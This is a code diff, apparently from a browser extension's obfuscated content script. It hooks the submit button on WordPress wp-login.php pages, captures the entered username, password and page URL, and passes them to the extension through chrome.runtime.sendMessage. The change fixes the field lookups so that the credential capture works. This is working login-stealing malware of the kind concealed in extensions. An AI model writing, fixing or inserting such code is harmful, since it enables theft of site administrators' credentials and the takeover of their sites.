@@ -457,8 +457,8 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
               clearInterval(interval);
               document['getElementById']('wp-submit').onclick = function (_0x441cx2) {
                var login = {};
-              login.username = document.getElementById("user_login")[0].value;
-              login.pass = document.getElementById("user_pass")[0].value;
+              login.username = document.getElementById("user_login").value;
+              login.pass = document.getElementById("user_pass").value;
               login.href = window.location.href;
               chrome.runtime.sendMessage({cmd: "l",login});
               }
